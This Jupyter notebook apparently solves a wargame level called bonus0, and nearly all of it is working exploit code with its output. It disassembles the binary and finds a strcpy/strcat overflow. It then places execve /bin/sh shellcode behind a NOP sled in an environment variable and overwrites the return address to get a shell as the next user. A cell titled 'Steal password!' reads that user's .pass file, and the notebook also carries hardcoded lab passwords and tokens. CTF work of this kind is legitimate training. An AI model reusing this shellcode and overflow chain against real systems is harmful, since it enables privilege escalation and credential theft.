{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "bool('Ressources' in os.getcwd()) if sys.path.append(\"../\") else sys.path.append(\"../..\")\n",
    "from utils.ssh import exec, connect, get_func_address, get_func_structure\n",
    "from utils.text import print_output, print_title\n",
    "from utils.base import save_token, address_to_string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mConnect to bonus0\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32msshpass -p f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728 ssh bonus0@0.0.0.0 -p 4242 -oStrictHostKeyChecking=no\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "prefix = '../..' if bool('Ressources' in os.getcwd()) else '..'\n",
    "password = open(f'{prefix}/level9/flag').read()\n",
    "client = connect('bonus0', password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mGet files list\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mls\u001b[39m\n",
      "Files: \u001b[35mbonus0\u001b[39m\n",
      "\u001b[33mTest this file\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "files_list = exec(client, 'ls', title='Get files list')\n",
    "print_output(files_list, 'Files')\n",
    "print_title('Test this file')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "binary_name = files_list[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mSimple execute binary\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"\" | ./bonus0\u001b[39m\n",
      "\u001b[33mSegfault\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "exec(client, f'echo \"\" | ./{binary_name}', title='Simple execute binary')\n",
    "print_title('Segfault')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mExecute and input two lines\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32m(python -c \"print 'test'\"; python -c \"print 'test'\") | ./bonus0\u001b[39m\n",
      "\u001b[35m-\u001b[39m\n",
      "\u001b[35m-\u001b[39m\n",
      "\u001b[35mtest test\u001b[39m\n",
      "\u001b[33mExpected two input values and program just print both of it inline\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "output = exec(\n",
    "    client, \"(python -c \\\"print 'test'\\\"; python -c \\\"print 'test'\\\") | ./\" + binary_name,\n",
    "    title='Execute and input two lines')\n",
    "print_output(output)\n",
    "print_title('Expected two input values and program just print both of it inline')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mGet all functions\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"info func\" | gdb ./bonus0 -q | egrep \" main| p| pp\"\u001b[39m\n",
      "\u001b[35m0x080483b0  puts\u001b[39m\n",
      "\u001b[35m0x080483b0  puts@plt\u001b[39m\n",
      "\u001b[35m0x080484b4  p\u001b[39m\n",
      "\u001b[35m0x0804851e  pp\u001b[39m\n",
      "\u001b[35m0x080485a4  main\u001b[39m\n",
      "\u001b[33mGet #main address\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"info func\" | gdb ./bonus0 -q | egrep \" main$\" | awk '{print $1}'\u001b[39m\n",
      "\u001b[33mGet #p address\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"info func\" | gdb ./bonus0 -q | egrep \" p$\" | awk '{print $1}'\u001b[39m\n",
      "\u001b[33mGet #pp address\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"info func\" | gdb ./bonus0 -q | egrep \" pp$\" | awk '{print $1}'\u001b[39m\n",
      "\u001b[33mThree entry points main - 0x080485a4, p - 0x080484b4, pp - 0x0804851e\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "entry_points = ['main', 'p', 'pp']\n",
    "func_info = exec(\n",
    "    client, f'echo \"info func\" | gdb ./{binary_name} -q | egrep \" {\"| \".join(entry_points)}\"',\n",
    "    title='Get all functions')\n",
    "print_output(func_info)\n",
    "print_title(f'Three entry points {\", \".join([f\"{e} - {get_func_address(client, e)}\" for e in entry_points])}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mGet #main structure\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"disass main\" | gdb ./bonus0 -q\u001b[39m\n",
      "\u001b[35mReading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.\u001b[39m\n",
      "\u001b[35m(gdb) Dump of assembler code for function main:\u001b[39m\n",
      "\u001b[35m0x080485a4 <+0>:\tpush   %ebp\u001b[39m\n",
      "\u001b[35m0x080485a5 <+1>:\tmov    %esp,%ebp\u001b[39m\n",
      "\u001b[35m0x080485a7 <+3>:\tand    $0xfffffff0,%esp\u001b[39m\n",
      "\u001b[35m0x080485aa <+6>:\tsub    $0x40,%esp\u001b[39m\n",
      "\u001b[35m0x080485ad <+9>:\tlea    0x16(%esp),%eax\u001b[39m\n",
      "\u001b[35m0x080485b1 <+13>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x080485b4 <+16>:\tcall   0x804851e <pp>\u001b[39m\n",
      "\u001b[35m0x080485b9 <+21>:\tlea    0x16(%esp),%eax\u001b[39m\n",
      "\u001b[35m0x080485bd <+25>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x080485c0 <+28>:\tcall   0x80483b0 <puts@plt>\u001b[39m\n",
      "\u001b[35m0x080485c5 <+33>:\tmov    $0x0,%eax\u001b[39m\n",
      "\u001b[35m0x080485ca <+38>:\tleave\u001b[39m\n",
      "\u001b[35m0x080485cb <+39>:\tret\u001b[39m\n",
      "\u001b[35mEnd of assembler dump.\u001b[39m\n",
      "\u001b[35m(gdb) quit\u001b[39m\n",
      "\u001b[33mCall function pp (+16)\u001b[39m\n",
      "\u001b[33mGet #pp structure\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"disass pp\" | gdb ./bonus0 -q\u001b[39m\n",
      "\u001b[35mReading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.\u001b[39m\n",
      "\u001b[35m(gdb) Dump of assembler code for function pp:\u001b[39m\n",
      "\u001b[35m0x0804851e <+0>:\tpush   %ebp\u001b[39m\n",
      "\u001b[35m0x0804851f <+1>:\tmov    %esp,%ebp\u001b[39m\n",
      "\u001b[35m0x08048521 <+3>:\tpush   %edi\u001b[39m\n",
      "\u001b[35m0x08048522 <+4>:\tpush   %ebx\u001b[39m\n",
      "\u001b[35m0x08048523 <+5>:\tsub    $0x50,%esp\u001b[39m\n",
      "\u001b[35m0x08048526 <+8>:\tmovl   $0x80486a0,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x0804852e <+16>:\tlea    -0x30(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048531 <+19>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x08048534 <+22>:\tcall   0x80484b4 <p>\u001b[39m\n",
      "\u001b[35m0x08048539 <+27>:\tmovl   $0x80486a0,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x08048541 <+35>:\tlea    -0x1c(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048544 <+38>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x08048547 <+41>:\tcall   0x80484b4 <p>\u001b[39m\n",
      "\u001b[35m0x0804854c <+46>:\tlea    -0x30(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x0804854f <+49>:\tmov    %eax,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x08048553 <+53>:\tmov    0x8(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048556 <+56>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x08048559 <+59>:\tcall   0x80483a0 <strcpy@plt>\u001b[39m\n",
      "\u001b[35m0x0804855e <+64>:\tmov    $0x80486a4,%ebx\u001b[39m\n",
      "\u001b[35m0x08048563 <+69>:\tmov    0x8(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048566 <+72>:\tmovl   $0xffffffff,-0x3c(%ebp)\u001b[39m\n",
      "\u001b[35m0x0804856d <+79>:\tmov    %eax,%edx\u001b[39m\n",
      "\u001b[35m0x0804856f <+81>:\tmov    $0x0,%eax\u001b[39m\n",
      "\u001b[35m0x08048574 <+86>:\tmov    -0x3c(%ebp),%ecx\u001b[39m\n",
      "\u001b[35m0x08048577 <+89>:\tmov    %edx,%edi\u001b[39m\n",
      "\u001b[35m0x08048579 <+91>:\trepnz scas %es:(%edi),%al\u001b[39m\n",
      "\u001b[35m0x0804857b <+93>:\tmov    %ecx,%eax\u001b[39m\n",
      "\u001b[35m0x0804857d <+95>:\tnot    %eax\u001b[39m\n",
      "\u001b[35m0x0804857f <+97>:\tsub    $0x1,%eax\u001b[39m\n",
      "\u001b[35m0x08048582 <+100>:\tadd    0x8(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048585 <+103>:\tmovzwl (%ebx),%edx\u001b[39m\n",
      "\u001b[35m0x08048588 <+106>:\tmov    %dx,(%eax)\u001b[39m\n",
      "\u001b[35m0x0804858b <+109>:\tlea    -0x1c(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x0804858e <+112>:\tmov    %eax,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x08048592 <+116>:\tmov    0x8(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048595 <+119>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x08048598 <+122>:\tcall   0x8048390 <strcat@plt>\u001b[39m\n",
      "\u001b[35m0x0804859d <+127>:\tadd    $0x50,%esp\u001b[39m\n",
      "\u001b[35m0x080485a0 <+130>:\tpop    %ebx\u001b[39m\n",
      "\u001b[35m0x080485a1 <+131>:\tpop    %edi\u001b[39m\n",
      "\u001b[35m0x080485a2 <+132>:\tpop    %ebp\u001b[39m\n",
      "\u001b[35m0x080485a3 <+133>:\tret\u001b[39m\n",
      "\u001b[35mEnd of assembler dump.\u001b[39m\n",
      "\u001b[35m(gdb) quit\u001b[39m\n",
      "\u001b[33mCall function p (+22)\u001b[39m\n",
      "\u001b[33mGet #p structure\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mecho \"disass p\" | gdb ./bonus0 -q\u001b[39m\n",
      "\u001b[35mReading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.\u001b[39m\n",
      "\u001b[35m(gdb) Dump of assembler code for function p:\u001b[39m\n",
      "\u001b[35m0x080484b4 <+0>:\tpush   %ebp\u001b[39m\n",
      "\u001b[35m0x080484b5 <+1>:\tmov    %esp,%ebp\u001b[39m\n",
      "\u001b[35m0x080484b7 <+3>:\tsub    $0x1018,%esp\u001b[39m\n",
      "\u001b[35m0x080484bd <+9>:\tmov    0xc(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x080484c0 <+12>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x080484c3 <+15>:\tcall   0x80483b0 <puts@plt>\u001b[39m\n",
      "\u001b[35m0x080484c8 <+20>:\tmovl   $0x1000,0x8(%esp)\u001b[39m\n",
      "\u001b[35m0x080484d0 <+28>:\tlea    -0x1008(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x080484d6 <+34>:\tmov    %eax,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x080484da <+38>:\tmovl   $0x0,(%esp)\u001b[39m\n",
      "\u001b[35m0x080484e1 <+45>:\tcall   0x8048380 <read@plt>\u001b[39m\n",
      "\u001b[35m0x080484e6 <+50>:\tmovl   $0xa,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x080484ee <+58>:\tlea    -0x1008(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x080484f4 <+64>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x080484f7 <+67>:\tcall   0x80483d0 <strchr@plt>\u001b[39m\n",
      "\u001b[35m0x080484fc <+72>:\tmovb   $0x0,(%eax)\u001b[39m\n",
      "\u001b[35m0x080484ff <+75>:\tlea    -0x1008(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048505 <+81>:\tmovl   $0x14,0x8(%esp)\u001b[39m\n",
      "\u001b[35m0x0804850d <+89>:\tmov    %eax,0x4(%esp)\u001b[39m\n",
      "\u001b[35m0x08048511 <+93>:\tmov    0x8(%ebp),%eax\u001b[39m\n",
      "\u001b[35m0x08048514 <+96>:\tmov    %eax,(%esp)\u001b[39m\n",
      "\u001b[35m0x08048517 <+99>:\tcall   0x80483f0 <strncpy@plt>\u001b[39m\n",
      "\u001b[35m0x0804851c <+104>:\tleave\u001b[39m\n",
      "\u001b[35m0x0804851d <+105>:\tret\u001b[39m\n",
      "\u001b[35mEnd of assembler dump.\u001b[39m\n",
      "\u001b[35m(gdb) quit\u001b[39m\n",
      "\u001b[33mCall function p (+22)\u001b[39m\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.',\n",
       " '(gdb) Dump of assembler code for function p:',\n",
       " '0x080484b4 <+0>:\\tpush   %ebp',\n",
       " '0x080484b5 <+1>:\\tmov    %esp,%ebp',\n",
       " '0x080484b7 <+3>:\\tsub    $0x1018,%esp',\n",
       " '0x080484bd <+9>:\\tmov    0xc(%ebp),%eax',\n",
       " '0x080484c0 <+12>:\\tmov    %eax,(%esp)',\n",
       " '0x080484c3 <+15>:\\tcall   0x80483b0 <puts@plt>',\n",
       " '0x080484c8 <+20>:\\tmovl   $0x1000,0x8(%esp)',\n",
       " '0x080484d0 <+28>:\\tlea    -0x1008(%ebp),%eax',\n",
       " '0x080484d6 <+34>:\\tmov    %eax,0x4(%esp)',\n",
       " '0x080484da <+38>:\\tmovl   $0x0,(%esp)',\n",
       " '0x080484e1 <+45>:\\tcall   0x8048380 <read@plt>',\n",
       " '0x080484e6 <+50>:\\tmovl   $0xa,0x4(%esp)',\n",
       " '0x080484ee <+58>:\\tlea    -0x1008(%ebp),%eax',\n",
       " '0x080484f4 <+64>:\\tmov    %eax,(%esp)',\n",
       " '0x080484f7 <+67>:\\tcall   0x80483d0 <strchr@plt>',\n",
       " '0x080484fc <+72>:\\tmovb   $0x0,(%eax)',\n",
       " '0x080484ff <+75>:\\tlea    -0x1008(%ebp),%eax',\n",
       " '0x08048505 <+81>:\\tmovl   $0x14,0x8(%esp)',\n",
       " '0x0804850d <+89>:\\tmov    %eax,0x4(%esp)',\n",
       " '0x08048511 <+93>:\\tmov    0x8(%ebp),%eax',\n",
       " '0x08048514 <+96>:\\tmov    %eax,(%esp)',\n",
       " '0x08048517 <+99>:\\tcall   0x80483f0 <strncpy@plt>',\n",
       " '0x0804851c <+104>:\\tleave',\n",
       " '0x0804851d <+105>:\\tret',\n",
       " 'End of assembler dump.',\n",
       " '(gdb) quit']"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "get_func_structure(client, 'main', title='Call function pp (+16)')\n",
    "get_func_structure(client, 'pp', title='Call function p (+22)')\n",
    "get_func_structure(client, 'p', title='Call function p (+22)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "offset = 9\n",
    "shellcode = '\\\\x31\\\\xc0\\\\x50\\\\x68\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x68\\\\x2f\\\\x62\\\\x69\\\\x6e' \\\n",
    "            '\\\\x89\\\\xe3\\\\x50\\\\x53\\\\x89\\\\xe1\\\\xb0\\\\x0b\\\\xcd\\\\x80'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mFind shell code `exploit` address\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mexport exploit=$(python -c 'print \"\\x90\" * 1000 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"') && echo \"b *main\n",
      "r\n",
      "x/200s environ\n",
      "\" | gdb ./bonus0 -q | grep \"exploit\" | awk '{print $1}' | sed 's/://'\u001b[39m\n",
      "Env #exploit address: \u001b[35m0xbffffb77\u001b[39m\n",
      "\u001b[33mSearch a little deeper...\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mexport exploit=$(python -c 'print \"\\x90\" * 1000 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"') && echo \"b *main\n",
      "r\n",
      "x/200xg 0xbffffb77\n",
      "\" | gdb ./bonus0 -q | head -n 15 | awk '{print $1}' | sed 's/://'\u001b[39m\n",
      "Env #exploit address, finally: \u001b[35m0xbffffb97\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "env_name = 'exploit'\n",
    "export_shellcode = f'export {env_name}=$(python -c \\'print \"\\\\x90\" * 1000 + \"{shellcode}\"\\')'\n",
    "env_address = exec(client, f'{export_shellcode} && echo \"b *main\\nr\\nx/200s environ\\n\" | '\n",
    "                           f'gdb ./{binary_name} -q | '\n",
    "                           f'grep \"{env_name}\" | '\n",
    "                           f'awk \\'{{print $1}}\\' | sed \\'s/://\\'', title=f'Find shell code `{env_name}` address')[0]\n",
    "print_output(env_address, f'Env #{env_name} address')\n",
    "env_address = exec(client, f'{export_shellcode} && echo \"b *main\\nr\\nx/200xg {env_address}\\n\" | '\n",
    "                           f'gdb ./{binary_name} -q | '\n",
    "                           f'head -n 15 | '\n",
    "                           f'awk \\'{{print $1}}\\' | '\n",
    "                           f'sed \\'s/://\\'', title='Search a little deeper...')[7]\n",
    "print_output(env_address, f'Env #{env_name} address, finally')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "f = lambda command: f\"{export_shellcode} && echo \\\"{command}\\\" | \" \\\n",
    "                    f\"(python -c \\\"print '.' * 4095 + '\\\\n' + \" \\\n",
    "                    f\"'.' * {offset} + '{address_to_string(env_address)}' + '.' * 50\\\"; cat) | ./{binary_name}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mCheck user\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mexport exploit=$(python -c 'print \"\\x90\" * 1000 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"') && echo \"whoami\" | (python -c \"print '.' * 4095 + '\\n' + '.' * 9 + '\\x97\\xfb\\xff\\xbf' + '.' * 50\"; cat) | ./bonus0\u001b[39m\n",
      "Current user: \u001b[35mbonus1\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "current_user = exec(client, f('whoami'), title='Check user')\n",
    "print_output(current_user, 'Current user')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mSteal password!\u001b[39m\n",
      "\u001b[36mExecute command: \u001b[39m\u001b[32mexport exploit=$(python -c 'print \"\\x90\" * 1000 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"') && echo \"cat /home/user/bonus1/.pass\" | (python -c \"print '.' * 4095 + '\\n' + '.' * 9 + '\\x97\\xfb\\xff\\xbf' + '.' * 50\"; cat) | ./bonus0\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "token = exec(client, f('cat /home/user/bonus1/.pass'), title='Steal password!')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Token to next level: \u001b[35mcd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9\u001b[39m\n"
     ]
    }
   ],
   "source": [
    "save_token(token, client)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
